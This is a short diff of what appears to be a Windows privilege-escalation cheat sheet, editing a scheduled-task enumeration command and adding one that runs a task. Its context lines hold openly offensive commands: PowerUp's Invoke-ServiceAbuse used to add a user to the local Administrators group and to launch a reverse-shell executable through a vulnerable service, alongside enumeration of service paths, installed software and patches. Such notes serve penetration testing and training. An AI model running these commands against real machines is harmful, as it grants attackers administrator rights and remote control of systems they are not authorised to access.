@@ -87,7 +87,8 @@ Invoke-ServiceAbuse -Name "VulnerableServiceName" -Command "net localgroup Admin
 Invoke-ServiceAbuse -Name "VulnerableServiceName" -Command "C:\Windows\Temp\reverse_shell.exe"
 
 wmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
-schtasks /query /fo LIST /v
+schtasks /query /fo LIST /v | findstr /i /c:"TaskName:" /c:"Task To Run:"
+schtasks /run /tn "path\to\taskname"
 "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select Displayname
 Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
 ```
